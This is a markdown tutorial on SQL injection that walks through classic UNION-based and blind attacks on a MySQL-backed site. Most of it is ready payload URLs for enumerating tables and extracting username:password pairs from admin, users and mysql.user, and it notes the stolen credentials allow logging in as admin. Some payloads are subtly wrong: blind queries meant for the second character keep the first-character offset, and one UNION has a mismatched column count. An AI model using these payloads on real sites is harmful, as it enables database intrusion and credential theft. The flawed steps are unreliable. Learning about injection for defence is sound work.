# SQL Injection

This tutorial was created to help understand SQL Injection, and describes how it works.

## What is SQL injection?

SQL Injection is one of the most common vulnerabilities found in Web Applications.
Since SQL is a query language this allows attackers to execute database query in the 
URL and gain access to sensitive information.

### The Most Common Types:

1. SQL Injection (Classic / Error Based)

2. Blind SQL Injection 


## SQL Injection (Classic / Error Based)

Let’s take a look at a Web Application and try to determine if the application is susceptible to SQL Injection

#### 1. Checking For Vulnerabilities

   Let's use the following website as an example: 
   
   ``` 
   http://mysite/products.php?id=5
   ``` 
   
   To check if this website is vulnerable to SQL Injection we simply add a ' (quote) to the end of the URL:

   ```   
   http://mysite/products.php?id=5'
   ```

   The Web application should generate an SQL Syntax error like the output below:
   
   ```   
   1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1.
   ```

   Great, this means the web application is vulnerable to SQL Injection. 
   
   **Note**: The error message above is largely dependent on the type of database running on the server and error messages
    vary from database to database



#### 2. Finding The Number of Columns

   To find the number of columns we need to use a statement that tells the database how to order the results. 
   Using the **ORDER BY** statement we simply increase the order until the database returns an error.

   ```
   http://mysite/products.php?id=5 order by 1/* <-- no error
   ```
   ```
   http://mysite/products.php?id=5 order by 2/* <-- no error
   ```  
   ```
   http://mysite/products.php?id=5 order by 3/* <-- no error
   ```
   ```
   http://mysite/products.php?id=5 order by 4/* <-- We receive an error message: Unknown column '4' in 'order clause'
   ```

   This means the database has 3 columns, because we got an error on the 4th column.
   

#### 3. Checking For The UNION Function

   With the union function we can select more data in one SQL statement.
   ```
   http://mysite/products.php?id=5 union all select 1,2,3/* 
   ```
   
   If some of the numbers are displayed on the screen, i.e. 1 or 2 or 3 the UNION statement works
   

#### 4. Checking The MySQL Version
   Let’s use the following example to check the MySQL Version:
   
   ```
   http://mysite/products.php?id=5 union all select 1,2,3/* 
   ```

   **Note**: if /* is not working or you get some kind of error, then try --
   This is a comment and it's important for our query to work properly.

   After performing the above query, we should see a number returned to the screen, let’s say the number 2 is returned.
   To check the version we just need to replace the number 2 with @@version or version() the output should look similar to this: 
   ```
   http://mysite/products.php?id=5 union all select 1,@@version,3/*
   ```
   if you get an error "union + illegal mix of collations (IMPLICIT + COERCIBLE) ..." then we need to use the convert() function to avoid this error.

   ```
   http://mysite/products.php?id=5 union all select 1,convert(@@version using latin1),3/*
   ```
   We can also use hex() and unhex()

   ```
   http://mysite/products.php?id=5 union all select 1,unhex(hex(@@version)),3/*
   ```   
   
   This will return the MySQL version 



#### 5. Getting Table and Column Name

   Knowing the version of MySQL is important as this determines how we can find the table and column name. If the version 
   of MYSQL is below version 5 (i.e. 4.1.33, 4.1.12...) we will have to try guess the table and column name

   **Here are a list of common table names:** user/s, admin/s, member/s 

   **Here are a list of common column names:** username, user, usr, user_name, password, pass, passwd, pwd etc...

   **Here is an example of how to check a table name:**
   ```
   http://mysite/products.php?id=5 union all select 1,2,3 from admin/* 
   ```
   
   If we see a number on the screen like before e.g. the number 2 then we know that the admin table exists.

   **Here is an example of how to check a column name:**
   ```
   http://mysite/products.php?id=5 union all select 1,username,3 from admin/* 
   ```

   If you get an error, then try a different column name. But if a username is displayed on screen e.g. admin, or superadmin etc...
   then we know we have successfully found a correct column

   Next let's see if the column password exists
   ```
   http://mysite/products.php?id=5 union all select 1,password,3 from admin/* (if you get an error, then try the other column name)
   ```
   
   If you get an error, then try a different column name. But if a password is displayed on screen e.g. plaintext, or md5 hash, mysql hash, sha1...
   then we know we have been successful.
   
   Now let's complete the query using the concat() function to join the strings
   ```
   http://mysite/products.php?id=5 union all select 1,concat(username,0x3a,password),3 from admin/*
   ```
   **Note:** That the 0x3a is the hex value for a colon " : " , or we could also use char(58) which is the ascii value for a colon.
   ```
   http://mysite/products.php?id=5 union all select 1,concat(username,char(58),password),3 from admin/*
   ```
   
   Now we should get the username and password displayed on the screen, i.e admin:admin or admin:somehash

   Once you have this you can login as an admin user or some superuser

   If can't manage to guess the right table name, you can always try mysql.user (default)
   ```
   http://mysite/products.php?id=5 union all select 1,concat(user,0x3a,password),3 from mysql.user/*
   ```
   
#### 6. MySQL Version 5

   Previously we looked at MySQL that was running below version 5 now let’s look at how to get table and column names
   from MySQL version 5 and above.

   One of the most important things we need is the information_schema this holds all tables and columns in the database.
   To get the tables we need to use table_name and information_schema.tables.
   ```
   http://mysite/products.php?id=5 union all select 1,table_name,3 from information_schema.tables/*
   ```
   
   Here we just replaced our number 2 with table_name to get the first table from information_schema.tables
   then the tables should be displayed on the screen. 
   
   Now we must add LIMIT to the end of the query to list out all tables.
   ```
   http://mysite/products.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 0,1/*
   ```
  **Note:** 0,1 is added after limit this gets the results starting from 0 through 1 as the starting index of a database begins at 0
  
   Next we want to view the second table, so we change limit 0,1 to limit 1,1
  
   ```
   http://mysite/products.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 1,1/*
   ```
   The second table is then displayed.

   For the third table we change limit 1,1 to limit 2,1

   ```
   http://mysite/products.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 2,1/*
   ```
   Let's keep incrementing until some useful like db_admin, poll_user, auth, auth_user etc... 

   To get the column names the method is the same as above. Here we use column_name and information_schema.columns
   ```
   http://mysite/products.php?id=5 union all select 1,column_name,3 from information_schema.columns limit 0,1/*
   ```
   The first column is then displayed.

   The second column we change limit 0,1 to limit 1,1
   ```
   http://mysite/products.php?id=5 union all select 1,column_name,3 from information_schema.columns limit 1,1/*
   ```
   
   The second column should be displayed, continue incrementing until you get something like username,user,login, password, pass, passwd etc...

   If you wanted to display the column names for a specific table the WHERE query can be used. 

   Let's say that we found table users
   ```
   http://mysite/products.php?id=5 union all select 1,column_name,3 from information_schema.columns where table_name='users'/*
   ```
  
   Now the column name in table users is displayed. Using LIMIT we can list all of the columns in the table users.

   **Note:** The quotes in the 'users' has to be added for this to work.

   Let's say we found the columns user, pass and email, to complete the query we can join them all together using concat().
   ```
   http://mysite/products.php?id=5 union all select 1,concat(user,0x3a,pass,0x3a,email) from users/*
   ```
  We should now be able to see the user:pass:email from table users.

  example: admin:hash:admin@somesite.com
 
  This section has covered SQL Injection, next we will cover Blind SQL Injection.
   



## Blind SQL Injection

Blind injection is a little more complicated than classic SQL Injection

There is very good blind SQL Injection tutorial that's also worth a read that can be found here:
```
https://spike188.wordpress.com/category/blind-sql-injection/
```

So let's dive straight in and look at the first example we will be using:
```
http://mysite/products.php?id=5
```
when we execute this webpage, we will likely see a page and articles on that page, pictures etc...

However, what happens when we want to test it for a blind SQL Injection attack? Let's take a look at what’s in the URL.
```
http://mysite/products.php?id=5 and 1=1 <--- This is always true and the page loads normally, that's ok.
```

Now for the real test
```
http://mysite/products.php?id=5 and 1=2 <--- This is false
```
Which means if some text, picture or content is missing on the returned page then that site is vulnerable to blind SQL Injection.


### 1. Get The MySQL Version

To get the version of MySQL in a blind attack we use substring
```
http://mysite/products.php?id=5 and substring(@@version,1,1)=4
```
This should return TRUE if the version of MySQL is version 4, if we wanted to check if the version war running version 5 we simply replace 4 with 5, and if query return TRUE then version 5 is being used.
```
http://mysite/products.php?id=5 and substring(@@version,1,1)=5
```

### 2. Testing if Subselect Works

When select doesn't work then we can use subselect
```
http://mysite/products.php?id=5 and (select 1)=1
```
If page loads normally then subselects works.


Next let's see if we have access to mysql.user, this is typically were usernames and passwords are stored
```
http://mysite/products.php?id=5 and (select 1 from mysql.user limit 0,1)=1
```
If the page loads normally we have access to mysql.user, later we can pull passwords using the load_file() function and OUTFILE.

### 3. Checking The Table and Column Names

Checking for the table and column names involves a little bit of guess work, let's look at the finding the tables first.
```
http://mysite/products.php?id=5 and (select 1 from users limit 0,1)=1 (with limit 0,1 our query here returns 1 row of data, cause subselect returns only 1 row, this is very important.)
```
If the page loads normally without content missing, then we know the table users exits.
if you get some missing articles then the result was FALSE and we need to continue guessing the table name until we guess the right one.

Let's say that we found a table called users, now all we need to do is find the column name.

Following the same process as the table name we start by guessing the name of the column. 
As previously mentioned try to look for common column names, here we will try the column name password as an example.
```
http://mysite/products.php?id=5 and (select substring(concat(1,password),1,1) from users limit 0,1)=1
```
If the page loads normally we know that column name is password, if the result was FALSE then we continue guessing until we find the right one.

Here we merge 1 with the column password and the substring returns the first character (,1,1)


### 4. Pulling Data From The Database

Now that we found the table name called users and column name called password, we will try to pull characters from the database.
```
http://mysite/products.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>80
```
This then pulls the first character from the first user in the users table.

Here the substring returns the first character and is 1 character in length, ascii() then converts that 1 character into an ascii value and compares it with the greater then > symbol.

So if the ascii character is greater than 80, the page loads normally and the result is TRUE. But we need to keep trying until we get a FALSE.
```
http://mysite/products.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>95
```
The above URL returns TRUE for 95 so we keep incrementing until we get FALSE.
```
http://mysite/products.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>98
```
Once again 98 returns TRUE and we keep incrementing.
```
http://mysite/products.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99
```
Success, finally 99 returns FALSE!!!

This now means that the first character in username is char(99), using an online ascii converter we now know that char(99) is the letter 'c'.

Next let's check for the second character.
```
http://mysite/products.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))>99
```

**Note:** I have changed ,1,1 to ,2,1 to get the second character, this will return the second character with 1 character in length.

```
http://mysite/products.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99
```
The above URL returns TRUE for 99 so we keep incrementing until we get FALSE.
```
http://mysite/products.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>107
```
This time the above URL returns FALSE for 107 so we need to find a number between 99 and 107
```
http://mysite/products.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>104
```
The above URL returns TRUE for 104 so we keep incrementing until we get FALSE.
```
http://mysite/products.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>105
```
Success, 105 returns FALSE!!!

We now know that the second character is char(105) and that the ascii value of char(105) is equal to 'i', so far we now have We have 'ci'.

Just keep incrementing until >0 returns false, then we know that we have reached the end.

There are some great tools for Blind SQL Injection and SQLmap is probably the best, but it's important to understand how to do this manually to better understand how SQL Injection works.

If you interested in finding and understanding Web Application Vulnerabilities I would highly recommend Hacker101's free tutorials:
```
https://www.hacker101.com/
```
